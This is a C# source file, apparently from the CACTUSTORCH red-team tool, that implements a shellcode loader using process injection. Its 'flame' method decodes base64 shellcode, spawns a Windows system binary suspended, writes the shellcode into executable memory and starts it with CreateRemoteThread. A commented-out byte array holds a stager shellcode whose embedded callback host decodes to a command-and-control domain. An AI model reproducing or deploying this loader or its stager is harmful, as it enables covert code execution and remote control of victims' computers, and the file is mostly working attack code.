//    This file is part of DotNetToJScript.
//    Copyright (C) James Forshaw 2017
//
//    DotNetToJScript is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    DotNetToJScript is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with DotNetToJScript.  If not, see <http://www.gnu.org/licenses/>.

using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System;
using System.Text;

[ComVisible(true)]
public class cactusTorch
{

    [StructLayout(LayoutKind.Sequential)]
    public class SecurityAttributes
    {
        public Int32 Length = 0;
        public IntPtr lpSecurityDescriptor = IntPtr.Zero;
        public bool bInheritHandle = false;

        public SecurityAttributes()
        {
            this.Length = Marshal.SizeOf(this);
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct ProcessInformation
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public Int32 dwProcessId;
        public Int32 dwThreadId;
    }

    [Flags]
    public enum CreateProcessFlags : uint
    {
        DEBUG_PROCESS = 0x00000001,
        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
        CREATE_SUSPENDED = 0x00000004,
        DETACHED_PROCESS = 0x00000008,
        CREATE_NEW_CONSOLE = 0x00000010,
        NORMAL_PRIORITY_CLASS = 0x00000020,
        IDLE_PRIORITY_CLASS = 0x00000040,
        HIGH_PRIORITY_CLASS = 0x00000080,
        REALTIME_PRIORITY_CLASS = 0x00000100,
        CREATE_NEW_PROCESS_GROUP = 0x00000200,
        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
        CREATE_SEPARATE_WOW_VDM = 0x00000800,
        CREATE_SHARED_WOW_VDM = 0x00001000,
        CREATE_FORCEDOS = 0x00002000,
        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
        INHERIT_PARENT_AFFINITY = 0x00010000,
        INHERIT_CALLER_PRIORITY = 0x00020000,
        CREATE_PROTECTED_PROCESS = 0x00040000,
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
        PROCESS_MODE_BACKGROUND_END = 0x00200000,
        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
        CREATE_NO_WINDOW = 0x08000000,
        PROFILE_USER = 0x10000000,
        PROFILE_KERNEL = 0x20000000,
        PROFILE_SERVER = 0x40000000,
        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
    }

    [Flags]
    public enum DuplicateOptions : uint
    {
        DUPLICATE_CLOSE_SOURCE = 0x00000001,
        DUPLICATE_SAME_ACCESS = 0x00000002
    }

    [StructLayout(LayoutKind.Sequential)]
    public class StartupInfo
    {
        public Int32 cb = 0;
        public IntPtr lpReserved = IntPtr.Zero;
        public IntPtr lpDesktop = IntPtr.Zero; // MUST be Zero
        public IntPtr lpTitle = IntPtr.Zero;
        public Int32 dwX = 0;
        public Int32 dwY = 0;
        public Int32 dwXSize = 0;
        public Int32 dwYSize = 0;
        public Int32 dwXCountChars = 0;
        public Int32 dwYCountChars = 0;
        public Int32 dwFillAttribute = 0;
        public Int32 dwFlags = 0;
        public Int16 wShowWindow = 0;
        public Int16 cbReserved2 = 0;
        public IntPtr lpReserved2 = IntPtr.Zero;
        public IntPtr hStdInput = IntPtr.Zero;
        public IntPtr hStdOutput = IntPtr.Zero;
        public IntPtr hStdError = IntPtr.Zero;

        public StartupInfo()
        {
            this.cb = Marshal.SizeOf(this);
        }
    }

    [Flags()]
    public enum AllocationType : uint
    {
        COMMIT = 0x1000,
        RESERVE = 0x2000,
        GO = 0x3000,
        RESET = 0x80000,
        LARGE_PAGES = 0x20000000,
        PHYSICAL = 0x400000,
        TOP_DOWN = 0x100000,
        WRITE_WATCH = 0x200000
    }


    [Flags()]
    public enum MemoryProtection : uint
    {
        EXECUTE = 0x10,
        EXECUTE_READ = 0x20,
        EXECUTE_READWRITE = 0x40,
        EXECUTE_WRITECOPY = 0x80,
        NOACCESS = 0x01,
        READONLY = 0x02,
        READWRITE = 0x04,
        WRITECOPY = 0x08,
        GUARD_Modifierflag = 0x100,
        NOCACHE_Modifierflag = 0x200,
        WRITECOMBINE_Modifierflag = 0x400
    }

    // CreateProcessA
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateProcessA(
            String lpApplicationName,
            String lpCommandLine,
            SecurityAttributes lpProcessAttributes,
            SecurityAttributes lpThreadAttributes,
            Boolean bInheritHandles,
            CreateProcessFlags dwCreationFlags,
            IntPtr lpEnvironment,
            String lpCurrentDirectory,
            [In] StartupInfo lpStartupInfo,
            out ProcessInformation lpProcessInformation

        );

    // VirtualAllocEx
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(
           IntPtr lpHandle,
           IntPtr lpAddress,
           IntPtr dwSize,
           AllocationType flAllocationType,
           MemoryProtection flProtect
        );

    // WriteProcessMemory
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] buffer,
        IntPtr dwSize,
        int lpNumberOfBytesWritten);

    // TerminateProcess

    [DllImport("kernel32.dll")]
    public static extern bool TerminateProcess(
        IntPtr hProcess, 
        uint uExitCode);

    // CreateRemoteThread
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(
        IntPtr hProcess,
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        IntPtr lpThreadId);

    public cactusTorch()
    {
        //MessageBox.Show("Test", "Test", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
    }

    public void flame(string binary, string shellcode32)
    {
    	// Written by Vincent Yiu (@vysecurity)

        // shellcode contains base64 shellcode
        // binary contains binary to inject into

        byte[] sc = Convert.FromBase64String(shellcode32);
        //byte[] sc = new byte[540] { 0xfc, 0xe8, 0x89, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xd2, 0x64, 0x8b, 0x52, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf0, 0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x42, 0x3c, 0x01, 0xd0, 0x8b, 0x40, 0x78, 0x85, 0xc0, 0x74, 0x4a, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x8b, 0x58, 0x20, 0x01, 0xd3, 0xe3, 0x3c, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0x31, 0xc0, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x38, 0xe0, 0x75, 0xf4, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe2, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x58, 0x5f, 0x5a, 0x8b, 0x12, 0xeb, 0x86, 0x5d, 0x68, 0x6e, 0x65, 0x74, 0x00, 0x68, 0x77, 0x69, 0x6e, 0x69, 0x54, 0x68, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0xe8, 0x80, 0x00, 0x00, 0x00, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x30, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x3b, 0x20, 0x42, 0x4f, 0x31, 0x49, 0x45, 0x38, 0x5f, 0x76, 0x31, 0x3b, 0x45, 0x4e, 0x55, 0x53, 0x29, 0x00, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x00, 0x59, 0x31, 0xff, 0x57, 0x57, 0x57, 0x57, 0x51, 0x68, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xeb, 0x79, 0x5b, 0x31, 0xc9, 0x51, 0x51, 0x6a, 0x03, 0x51, 0x51, 0x68, 0x50, 0x00, 0x00, 0x00, 0x53, 0x50, 0x68, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x62, 0x59, 0x31, 0xd2, 0x52, 0x68, 0x00, 0x02, 0x60, 0x84, 0x52, 0x52, 0x52, 0x51, 0x52, 0x50, 0x68, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x89, 0xc6, 0x31, 0xff, 0x57, 0x57, 0x57, 0x57, 0x56, 0x68, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0x44, 0x31, 0xff, 0x85, 0xf6, 0x74, 0x04, 0x89, 0xf9, 0xeb, 0x09, 0x68, 0xaa, 0xc5, 0xe2, 0x5d, 0xff, 0xd5, 0x89, 0xc1, 0x68, 0x45, 0x21, 0x5e, 0x31, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x6a, 0x07, 0x51, 0x56, 0x50, 0x68, 0xb7, 0x57, 0xe0, 0x0b, 0xff, 0xd5, 0xbf, 0x00, 0x2f, 0x00, 0x00, 0x39, 0xc7, 0x74, 0xbc, 0x31, 0xff, 0xeb, 0x15, 0xeb, 0x49, 0xe8, 0x99, 0xff, 0xff, 0xff, 0x2f, 0x6b, 0x4a, 0x5a, 0x4d, 0x00, 0x00, 0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x68, 0x00, 0x00, 0x40, 0x00, 0x57, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0x53, 0x53, 0x89, 0xe7, 0x57, 0x68, 0x00, 0x20, 0x00, 0x00, 0x53, 0x56, 0x68, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0xcd, 0x8b, 0x07, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xe5, 0x58, 0xc3, 0xe8, 0x37, 0xff, 0xff, 0xff, 0x6d, 0x61, 0x6c, 0x77, 0x61, 0x72, 0x65, 0x63, 0x32, 0x2e, 0x76, 0x69, 0x6e, 0x63, 0x65, 0x6e, 0x74, 0x79, 0x69, 0x75, 0x2e, 0x63, 0x6f, 0x2e, 0x75, 0x6b, 0x00 };
        IntPtr size = new IntPtr(sc.Length);
        StartupInfo sInfo = new StartupInfo();
        sInfo.dwFlags = 0;
        ProcessInformation pInfo;
        string binaryPath = "";
        // We check what architecture OS it is here

        if (Environment.GetEnvironmentVariable("ProgramW6432").Length > 0)
        {
            //64 bit
            binaryPath = Environment.GetEnvironmentVariable("windir") + "\\SysWOW64\\" + binary;
        }
        else
        {
            //32 bit
            binaryPath = Environment.GetEnvironmentVariable("windir") + "\\System32\\" + binary;
        }

        // We have select the correct directory, for the executeable

        // Create the Process in SUSPENDED state
        IntPtr funcAddr = CreateProcessA(binaryPath, null, null, null, true, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, sInfo, out pInfo);
        IntPtr hProcess = pInfo.hProcess;
        if (hProcess != IntPtr.Zero) { 
            //MessageBox.Show("hProcess: " + hProcess.ToString("X8"));
            // Use VirtualAllocEx to create some space

            IntPtr spaceAddr = VirtualAllocEx(hProcess, new IntPtr(0), size, AllocationType.GO, MemoryProtection.EXECUTE_READWRITE);

            //MessageBox.Show("Virtual Alloc: " + spaceAddr.ToString("X8"));

            if (spaceAddr == IntPtr.Zero)
            {
                // TerminateProcess incase failed to Valloc for some reason.
                TerminateProcess(hProcess, 0);
            }
            else
            {
                // Use WriteProcessMemory to WRITE "POKEMON" in
                int test = 0;

                IntPtr size2 = new IntPtr(sc.Length);
                bool bWrite = WriteProcessMemory(hProcess, spaceAddr, sc, size2, test);

                //MessageBox.Show("WriteProcessMemory: " + bWrite.ToString());

                // CreateRemoteThread to start it up
                CreateRemoteThread(hProcess, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));

            }
        }


        //Process.Start(shellcode);
    }
}

